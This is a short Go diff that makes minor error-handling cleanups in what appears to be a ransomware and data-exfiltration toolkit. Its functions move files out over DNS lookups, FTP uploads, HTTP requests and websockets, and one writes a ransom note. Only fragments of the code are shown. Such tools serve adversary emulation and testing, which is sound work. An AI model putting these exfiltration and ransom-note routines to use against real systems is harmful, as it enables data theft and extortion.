@@ -188,7 +188,7 @@ func DNSResolvedExfil(domain string) (ExfilFunc, error) {
 				}
 			}
 
-			net.LookupIP(fqdn)
+			_, _ = net.LookupIP(fqdn)
 		}
 
 		return nil
@@ -248,7 +248,7 @@ func FTPExfil(dst, user, passwd string) (ExfilFunc, error) {
 		defer m.Unlock()
 
 		// Make dirs
-		c.MakeDirRecur(filepath.Dir(path))
+		_ = c.MakeDirRecur(filepath.Dir(path))
 
 		// Upload file
 		if e = c.Stor(path, bytes.NewReader(b)); e != nil {
@@ -309,7 +309,7 @@ func FTPParallelExfil(dst, user, passwd string) (ExfilFunc, error) {
 		path = filepath.ToSlash(path)
 
 		// Make dirs
-		c.MakeDirRecur(filepath.Dir(path))
+		_ = c.MakeDirRecur(filepath.Dir(path))
 
 		// Upload file
 		if e = c.Stor(path, bytes.NewReader(b)); e != nil {
@@ -381,7 +381,7 @@ func HTTPExfil(
 			}
 
 			// Send Message and ignore response or errors
-			inet.DefaultClient.Do(req)
+			_, _ = inet.DefaultClient.Do(req)
 		}
 	}
 
@@ -406,7 +406,7 @@ func RansomNote(path string, text ...string) NotifyFunc {
 		defer f.Close()
 
 		for _, line := range text {
-			f.WriteString(line + "\n")
+			_, _ = f.WriteString(line + "\n")
 		}
 
 		return nil
@@ -625,7 +625,7 @@ func WebsocketParallelExfil(
 			return errors.Newf("failed Websocket connection: %w", e)
 		}
 		defer func() {
-			c.WriteMessage(
+			_ = c.WriteMessage(
 				ws.CloseMessage,
 				ws.FormatCloseMessage(ws.CloseNormalClosure, ""),
 			)
